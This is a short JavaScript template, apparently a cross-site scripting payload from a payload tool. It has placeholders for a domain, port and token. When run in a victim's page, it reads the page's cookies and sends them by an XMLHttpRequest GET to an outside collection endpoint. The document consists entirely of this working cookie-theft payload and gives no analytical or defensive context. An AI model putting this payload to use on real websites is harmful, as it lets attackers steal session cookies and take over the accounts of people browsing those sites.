
	var http = new XMLHttpRequest();
        http.open("GET", "{domain}{port}/x?token={token}&c="+encodeURIComponent(document.cookie), true);
	http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
	http.send();
